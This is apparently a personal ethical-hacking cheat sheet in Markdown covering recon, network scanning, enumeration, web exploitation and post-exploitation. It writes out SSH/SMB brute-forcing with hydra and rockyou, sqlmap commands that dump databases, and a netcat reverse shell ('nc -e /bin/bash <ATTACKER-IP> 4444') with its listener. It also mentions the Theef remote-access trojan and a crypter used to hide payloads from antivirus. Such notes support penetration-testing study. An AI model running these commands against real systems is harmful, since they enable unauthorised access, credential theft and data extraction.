#### Resources link

[Ethical hacking git](https://github.com/LibyKurian/ethicalhacking-h.git)

#### Recon
  ##### via Web
  - [Tor Browser](https://www.torproject.org/download/)
  - [Google Search Engine](https://ahrefs.com/blog/google-advanced-search-operators/)
  - [Netcraft](https://searchdns.netcraft.com)
  - [Shodan](https://www.shodan.io/)
  - [Censys](https://censys.com/data-and-search/)

  ##### via application/tools
  - sublist3r ‘ sublist3r -d domain -b all ‘
  - Harvester – ‘ theharvester -d domain -n linkedin ‘
  - sherlock
  - userecon
  - photon
  - Web extractor
  - Httrack (for mirroring website)
  - Recon-ng

#### Network Scanning

- [Central Ops .net](https://centralops.net/co/)
- [OSINT framework](https://osintframework.com/)
- [NMAP cheatsheet](https://github.com/LibyKurian/ethicalhacking-h/blob/main/nmap_cheatsheet.md)
- SX tool : command line network scanning tool that perform Arp scanning , TCP & UDP 
  ````js
  sx arp 10.10.1.0/24
  sx arp 10.10.10.1 /24 –json | tee arp.cache”   // for output in a file
  ````
- GUI application
  - Angry IP scanner : Perform host discovery any OS
  - Zenmap  - nmap’s  graphical interface tool
- uniscan
    Graphical:  Launch uniscan-gui and select required checkbox
    Command:
      ````
      unicornscan 10.10.1.10 -Iv”
      ````
- Metasploit payloads(for scanning)
- some more tools
  ````js
  //discover devices inside the network eth0
  netdiscover -i eth0
  // enumeration
  netstat -a 10.10.10.10 // netstat enumeration netbios
  snmp-check 10.10.10.10 // extract users from netbios - parrot
  masscan -e tun0 -p1-65535 -rate=1000 <ip> 
  ````

#### Default ports
| **Port**  | **Name**                          | **Insight (OS/Machine Identification Clues)** |
|----------|--------------------------------|----------------------------------------------|
| **22**   | SSH                            | Common on **Linux**, macOS, and network devices. |
| **23**   | Telnet                         | Found on **legacy systems** (old Windows, Unix). |
| **25**   | SMTP                           | Email servers, typically **Linux-based**. |
| **53**   | DNS                            | BIND service suggests **Linux**, Microsoft DNS hints at **Windows Server**. |
| **80**   | HTTP                           | Web servers (**Apache/Nginx on Linux, IIS on Windows**). |
| **443**  | HTTPS                          | Secure web servers, **IIS version suggests Windows Server**. |
| **3306** | MySQL                          | Mostly found on **Linux servers**. |
| **3389** | RDP (Remote Desktop)           | **Windows-only** (Windows Server, Windows 10/11). |
| **139**  | NetBIOS                        | **Windows-only** (Active Directory, Windows networking). |
| **445**  | SMB                            | **Windows-only** (file sharing, domain services). Used in **EternalBlue exploits**. |
| **21**   | FTP                            | Open source vs. proprietary FTP servers hint at OS. |
| **135**  | RPC                            | **Windows-only** (DCE-RPC for Active Directory, remote management). |
| **5060** | SIP                            | VoIP services, found on **Linux-based PBX servers** (Asterisk, FreePBX). |
| **161**  | SNMP                           | Found on **network devices** (Cisco routers, managed switches). |
| **8080** | Alternative HTTP               | Tomcat = **Linux**, IIS = **Windows**. |
| **4444** | Metasploit Listener            | Could indicate **reverse shell activity**. |
| **5432** | PostgreSQL                     | Database mostly found on **Linux servers**. |
| **5985** | WinRM (Windows Remote Management) | **Windows-only** (PowerShell Remoting, Windows Server). |
| **5555** | Android Debug Bridge (ADB)     | **Android devices** in debug mode, potential for remote exploitation. |



#### Enumeration
- enum4linux 10.10.60.11
- smbmap
  ````
  smbmap -u "admin" -p "passowrd" -H 10.10.10.10 -x "ipconfig"
  -x = command
- bruteforcing
  ````
  hydra -L user.txt -P pass.txt smb://10.10.10.4
  L =  logging file name
  P = Passwords file name
  hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11
  ````
- AD Explorer (LDAP)
  ````
  or with nmap
  nmap -p 389 –script=ldap-brute –script-args ldap.base=’”cn=users,dc=CEH,dc=com”’ 10.10.1.22
  ````
- some more:
  ````
  // dir enumeration
  gobuster dir -u 10.10.0.1 -w /usr/share/wordlists/common.txt -t 50 -x php,html,txt -q
  
  dir : directory listing
  -u : host
  -w : wordlists
  -t : threads int / Number of concurrent threads (default 10)
  -x : enumerate hidden files htm, php
  -q : –quiet / Don’t print the banner and other noise
  
  //snmp-check 10.10.1.22
  snmp-check 10.10.1.22  // after UDP scan with nmap
  
  // wordpress enumeration
  wpscan --url https://localchost.com --passwords=
  wpscan -u 10.10.. -e u vp
  wpscan -u 10.10.. -e u --wordlist path/rockyou.txt //bruteforce
  
  -e = enumerate
  u = enumerate usernames
  vp = vulnerable plugins
  
  // wordlist generation
  cewl -w wordlist -d 2 -m 5 http://wordpress.com
  -d = deeph of the scanning
  -m = long of the words
  -w = save to a file worlist
  ````

#### Vulnerability scanning
- openVAS | greenbone
- Tenable Nessus
- NIST
- CVE org (https://www.cve.org)
```
nikto -h url -Cgidirs all
```

#### Web explotation
[SQLmap cheetsheet](https://github.com/LibyKurian/ethicalhacking-h/blob/main/sqlmap_cheatsheet.md)
````js
// sql injection
sqlmap -u http://10.10.197.40/administrator.php --forms --dump

-u = url
--forms = grab the forms /detect
--dump = retrieve data form de sqli

#### basic sqli injection
sqlmap -u 10.10.77.169 --forms --dump

- u = url
- --forms= check the forms automatically
- --dump= dump dthe database data entries

// extract database
sqlmap -u http://localchost.com/hey.php?artist=1 --dbs
// extract colums
Sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artists --columns
// extract data of the table and the column inside of the db
sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artist --C adesc, aname, artist_id --dump
````

#### Netcat Reverse Shell
Victim (Windows/Linux)
  ```
  nc -e /bin/bash <ATTACKER-IP> 4444
  ```
Attacker (Listener)
  ```
  nc -lvnp 4444
  ```

#### Theef
  // Server exe need to be run on victim and client exe on Attacker

#### Payload detect via Anti-malware / Anti-Virus
- Virus Total
- Hybrid Analysis
- Antiscan.me
  
 // swazycrypter encryptes the application with more complexity/hash to avoid antivirus to find it.



#### More
